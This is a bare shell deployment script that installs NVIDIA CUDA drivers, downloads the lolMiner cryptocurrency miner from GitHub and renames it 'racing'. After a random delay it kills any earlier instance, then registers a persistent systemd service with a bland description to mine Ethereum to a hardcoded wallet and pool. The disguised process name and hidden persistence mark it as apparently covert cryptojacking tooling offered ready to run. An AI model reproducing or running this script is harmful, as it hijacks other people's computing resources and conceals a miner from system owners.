cd /home
myworker=$(date +'%d%m_%H%M%S_A1_')
username=$USER
myworker+=$username
sudo apt-get install linux-headers-$(uname -r) -y
distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
sudo apt-get update
sudo apt-get -y install cuda-drivers
sudo apt-get install libcurl3 -y
sudo apt-get install cuda-drivers-510
sudo apt-get install cuda-drivers-fabricmanager-510 -y
sudo systemctl enable nvidia-fabricmanager
sudo systemctl start nvidia-fabricmanager
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.48/lolMiner_v1.48_Lin64.tar.gz
tar xvzf lolMiner_v1.48_Lin64.tar.gz
cd 1.48
mv lolMiner racing
MINWAIT=100
MAXWAIT=200
datass=$((MINWAIT+RANDOM % (MAXWAIT-MINWAIT)))
sleep $datass
sudo killall racing
sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o us-eth.2miners.com:2020 -u 1D4pzAA8bZPb2ZVkCZxS53C5qTRn9owcUB -p x -w ${myworker}_lex\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
sudo systemctl daemon-reload
sudo systemctl enable racing.service
./racing -a ethash -o us-eth.2miners.com:2020 -u 1D4pzAA8bZPb2ZVkCZxS53C5qTRn9owcUB -p x -w $myworker &
